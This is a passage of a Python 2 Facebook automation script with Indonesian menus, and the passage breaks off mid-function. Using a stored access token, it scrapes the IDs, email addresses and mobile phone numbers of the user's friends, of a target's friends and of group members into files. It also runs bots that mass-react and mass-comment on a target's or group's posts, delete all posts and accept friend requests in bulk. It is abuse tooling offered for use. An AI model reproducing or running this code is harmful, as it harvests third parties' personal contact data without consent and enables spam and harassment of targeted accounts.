                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Akun Target Belum Berteman Dengan Anda'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                grab()

            r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(5000)&access_token=' + toket)
            z = json.loads(r.text)
            save_idt = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            bz = open(save_idt, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for ah in z['friends']['data']:
                idfromfriends.append(ah['id'])
                bz.write(ah['id'] + '\n')
                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + ah['name']
                print '\x1b[1;92mID   \x1b[1;91m : \x1b[1;97m' + ah['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile Disimpan \x1b[1;91m: \x1b[1;97m' + save_idt
            bz.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def id_member_grup():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            id = raw_input('\x1b[1;91m[+] \x1b[1;92mID grup \x1b[1;91m:\x1b[1;97m ')
            try:
                r = requests.get('https://graph.facebook.com/group/?id=' + id + '&access_token=' + toket)
                asw = json.loads(r.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama group \x1b[1;91m:\x1b[1;97m ' + asw['name']
            except KeyError:
                print '\x1b[1;91m[!] Group Tidak Ditemukan'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                grab()

            simg = raw_input('\x1b[1;91m[+] \x1b[1;97mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            b = open(simg, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            re = requests.get('https://graph.facebook.com/' + id + '/members?fields=name,id&access_token=' + toket)
            s = json.loads(re.text)
            for i in s['data']:
                idmem.append(i['id'])
                b.write(i['id'] + '\n')
                print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + i['name']
                print '\x1b[1;92mID  \x1b[1;91m  :\x1b[1;97m ' + i['id']
                print 52 * '\x1b[1;97m\xe2\x95\x90'

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal ID \x1b[1;96m%s' % len(idmem)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + simg
            b.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(simg)
            print '\x1b[1;91m[!] Group not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def email():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    em.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(em)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(mails)
            print '\x1b[1;91m[!] An error occurred'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def emailfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukkan ID Teman \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDari\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Belum Berteman'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                grab()

            mails = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            mpsh = open(mails, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    emfromfriends.append(z['email'])
                    mpsh.write(z['email'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mEmail\x1b[1;91m : \x1b[1;97m' + z['email']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Email\x1b[1;96m%s' % len(emfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + mails
            mpsh.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def nomor_hp():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSimpan File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            url = 'https://graph.facebook.com/me/friends?access_token=' + toket
            r = requests.get(url)
            z = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Bosss Ku \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for n in z['data']:
                x = requests.get('https://graph.facebook.com/' + n['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hp.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Nomor Telepon\x1b[1;96m%s' % len(hp)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Error when creating file'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except KeyError:
            os.remove(noms)
            print '\x1b[1;91m[!] An error occurred '
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def hpfrom_friends():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            os.system('clear')
            print logo
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            idt = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukkan ID Teman \x1b[1;91m: \x1b[1;97m')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mDari\x1b[1;91m :\x1b[1;97m ' + op['name']
            except KeyError:
                print '\x1b[1;91m[!] Belum Berteman'
                raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                grab()

            noms = raw_input('\x1b[1;91m[+] \x1b[1;92mSave File \x1b[1;97mext(file.txt) \x1b[1;91m: \x1b[1;97m')
            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            a = json.loads(r.text)
            no = open(noms, 'w')
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for i in a['data']:
                x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
                z = json.loads(x.text)
                try:
                    hpfromfriends.append(z['mobile_phone'])
                    no.write(z['mobile_phone'] + '\n')
                    print '\r\x1b[1;92mNama\x1b[1;91m  :\x1b[1;97m ' + z['name']
                    print '\x1b[1;92mPhone\x1b[1;91m : \x1b[1;97m' + z['mobile_phone']
                    print 52 * '\x1b[1;97m\xe2\x95\x90'
                except KeyError:
                    pass

            print '\n\r\x1b[1;91m[+] \x1b[1;97mTotal Nomor Telepon\x1b[1;96m%s' % len(hpfromfriends)
            print '\x1b[1;91m[+] \x1b[1;97mFile tersimpan \x1b[1;91m: \x1b[1;97m' + noms
            no.close()
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except IOError:
            print '\x1b[1;91m[!] Make file failed'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except (KeyboardInterrupt, EOFError):
            print '\x1b[1;91m[!] Stopped'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            grab()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
            keluar()


def menu_bot():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '\xe2\x95\x91-> \x1b[1;37;40m1. Bot Reaksi Postingan Target'
    print '\xe2\x95\x91-> \x1b[1;37;40m2. Bot Reaksi Postingan Grup'
    print '\xe2\x95\x91-> \x1b[1;37;40m3. Bot Komen Postingan Target'
    print '\xe2\x95\x91-> \x1b[1;37;40m4. Bot Komen Postingan Grup'
    print '\xe2\x95\x91-> \x1b[1;37;40m5. Hapus Semua Postingan'
    print '\xe2\x95\x91-> \x1b[1;37;40m6. Terima Permintaan Pertemanan'
    print '\xe2\x95\x91-> \x1b[1;37;40m7. Hapus Pertemanan'
    print '\xe2\x95\x91-> \x1b[1;31;40m0. Kembali'
    print '\x1b[1;37;40m\xe2\x95\x91'
    bot_pilih()


def bot_pilih():
    bots = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
    if bots == '':
        print "\x1b[1;91m[!] Can't empty"
        bot_pilih()
    elif bots == '1':
        menu_react()
    elif bots == '2':
        grup_react()
    elif bots == '3':
        bot_komen()
    elif bots == '4':
        grup_komen()
    elif bots == '5':
        deletepost()
    elif bots == '6':
        accept()
    elif bots == '7':
        unfriend()
    elif bots == '0':
        menu()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + bots + ' \x1b[1;91mTidak Ditemukan'
        bot_pilih()


def menu_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '\xe2\x95\x91-> \x1b[1;37;40m1. \x1b[1;97mLike'
    print '\xe2\x95\x91-> \x1b[1;37;40m2. \x1b[1;97mLove'
    print '\xe2\x95\x91-> \x1b[1;37;40m3. \x1b[1;97mWow'
    print '\xe2\x95\x91-> \x1b[1;37;40m4. \x1b[1;97mHaha'
    print '\xe2\x95\x91-> \x1b[1;37;40m5. \x1b[1;97mSedih'
    print '\xe2\x95\x91-> \x1b[1;37;40m6. \x1b[1;97mMarah'
    print '\xe2\x95\x91-> \x1b[1;31;40m0. Kembali'
    print '\x1b[1;37;40m\xe2\x95\x91'
    react_pilih()


def react_pilih():
    global tipe
    aksi = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
    if aksi == '':
        print "\x1b[1;91m[!] Can't empty"
        react_pilih()
    elif aksi == '1':
        tipe = 'LIKE'
        react()
    elif aksi == '2':
        tipe = 'LOVE'
        react()
    elif aksi == '3':
        tipe = 'WOW'
        react()
    elif aksi == '4':
        tipe = 'HAHA'
        react()
    elif aksi == '5':
        tipe = 'SAD'
        react()
    elif aksi == '6':
        tipe = 'ANGRY'
        react()
    elif aksi == '0':
        menu_bot()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mTidak Ditemukan'
        react_pilih()


def react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        try:
            oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for a in ah['feed']['data']:
                y = a['id']
                reaksi.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(reaksi))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID not found'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()


def grup_react():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '\xe2\x95\x91-> \x1b[1;37;40m1. \x1b[1;97mLike'
    print '\xe2\x95\x91-> \x1b[1;37;40m2. \x1b[1;97mLove'
    print '\xe2\x95\x91-> \x1b[1;37;40m3. \x1b[1;97mWow'
    print '\xe2\x95\x91-> \x1b[1;37;40m4. \x1b[1;97mHaha'
    print '\xe2\x95\x91-> \x1b[1;37;40m5. \x1b[1;97mSedih'
    print '\xe2\x95\x91-> \x1b[1;37;40m6. \x1b[1;97mMarah'
    print '\xe2\x95\x91-> \x1b[1;31;40m0. Kembali'
    print '\x1b[1;37;40m\xe2\x95\x91'
    reactg_pilih()


def reactg_pilih():
    global tipe
    aksi = raw_input('\xe2\x95\x9a\xe2\x95\x90\x1b[1;91m\xe2\x96\xb6\x1b[1;97m ')
    if aksi == '':
        print "\x1b[1;91m[!] Can't empty"
        reactg_pilih()
    elif aksi == '1':
        tipe = 'LIKE'
        reactg()
    elif aksi == '2':
        tipe = 'LOVE'
        reactg()
    elif aksi == '3':
        tipe = 'WOW'
        reactg()
    elif aksi == '4':
        tipe = 'HAHA'
        reactg()
    elif aksi == '5':
        tipe = 'SAD'
        reactg()
    elif aksi == '6':
        tipe = 'ANGRY'
        reactg()
    elif aksi == '0':
        menu_bot()
    else:
        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mTidak Ditemukan'
        reactg_pilih()


def reactg():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Group \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
        asw = json.loads(ah.text)
        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName group \x1b[1;91m:\x1b[1;97m ' + asw['name']
        try:
            oh = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            ah = json.loads(oh.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for a in ah['feed']['data']:
                y = a['id']
                reaksigrup.append(y)
                requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(reaksigrup))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak Ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()


def bot_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print "\x1b[1;91m[!] \x1b[1;92mGunakan \x1b[1;97m'<>' \x1b[1;92m Untuk Baris Baru"
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
        km = raw_input('\x1b[1;91m[+] \x1b[1;92mComments  \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        km = km.replace('<>', '\n')
        try:
            p = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for s in a['feed']['data']:
                f = s['id']
                komen.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(komen))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak Ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()


def grup_komen():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print "\x1b[1;91m[!] \x1b[1;92mGunakan \x1b[1;97m'<>' \x1b[1;92mUntuk Baris Baru"
        ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Group  \x1b[1;91m:\x1b[1;97m ')
        km = raw_input('\x1b[1;91m[+] \x1b[1;92mComments \x1b[1;91m:\x1b[1;97m ')
        limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
        km = km.replace('<>', '\n')
        try:
            ah = requests.get('https://graph.facebook.com/group/?id=' + ide + '&access_token=' + toket)
            asw = json.loads(ah.text)
            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName grup \x1b[1;91m:\x1b[1;97m ' + asw['name']
            p = requests.get('https://graph.facebook.com/v3.0/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
            a = json.loads(p.text)
            jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
            print 52 * '\x1b[1;97m\xe2\x95\x90'
            for s in a['feed']['data']:
                f = s['id']
                komengrup.append(f)
                requests.post('https://graph.facebook.com/' + f + '/comments?message=' + km + '&access_token=' + toket)
                print '\x1b[1;92m[\x1b[1;97m' + km[:10].replace('\n', ' ') + '... \x1b[1;92m]'

            print
            print '\r\x1b[1;91m[+]\x1b[1;97m Selesai \x1b[1;96m' + str(len(komengrup))
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()
        except KeyError:
            print '\x1b[1;91m[!] ID Tidak Ditemukan'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()


def deletepost():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
        nam = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        lol = json.loads(nam.text)
        nama = lol['name']
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    print '\x1b[1;91m[+] \x1b[1;92mDari \x1b[1;91m: \x1b[1;97m%s' % nama
    jalan('\x1b[1;91m[+] \x1b[1;92mMulai Menghapus Status\x1b[1;97m ...')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    asu = requests.get('https://graph.facebook.com/me/feed?access_token=' + toket)
    asus = json.loads(asu.text)
    for p in asus['data']:
        id = p['id']
        piro = 0
        url = requests.get('https://graph.facebook.com/' + id + '?method=delete&access_token=' + toket)
        ok = json.loads(url.text)
        try:
            error = ok['error']['message']
            print '\x1b[1;91m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;91m] \x1b[1;95mGagal'
        except TypeError:
            print '\x1b[1;92m[\x1b[1;97m' + id[:10].replace('\n', ' ') + '...' + '\x1b[1;92m] \x1b[1;96mMenghapus'
            piro += 1
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m[!] Connection Error'
            raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
            menu_bot()

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_bot()


def accept():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
    r = requests.get('https://graph.facebook.com/me/friendrequests?limit=' + limit + '&access_token=' + toket)
    friends = json.loads(r.text)
    if '[]' in str(friends['data']):
        print '\x1b[1;91m[!] Tidak Ada Permintaan Pertemanan'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
        menu_bot()
    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
    print 52 * '\x1b[1;97m\xe2\x95\x90'
    for i in friends['data']:
        gas = requests.post('https://graph.facebook.com/me/friends/' + i['from']['id'] + '?access_token=' + toket)
        a = json.loads(gas.text)
        if 'error' in str(a):
            print '\x1b[1;91m[+] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;91m Gagal'
            print 52 * '\x1b[1;97m\xe2\x95\x90'
        else:
            print '\x1b[1;91m[+] \x1b[1;92mNama  \x1b[1;91m:\x1b[1;97m ' + i['from']['name']
            print '\x1b[1;91m[+] \x1b[1;92mID    \x1b[1;91m:\x1b[1;97m ' + i['from']['id'] + '\x1b[1;92m Berhasil'
            print 52 * '\x1b[1;97m\xe2\x95\x90'

    print '\n\x1b[1;91m[+] \x1b[1;97mSelesai'
    raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
    menu_bot()


def unfriend():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        print logo
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mSabar Boss Ku \x1b[1;97m...')
        print 52 * '\x1b[1;97m\xe2\x95\x90'
        print '\x1b[1;97mStop \x1b[1;91mCTRL+C'
        print
        try:
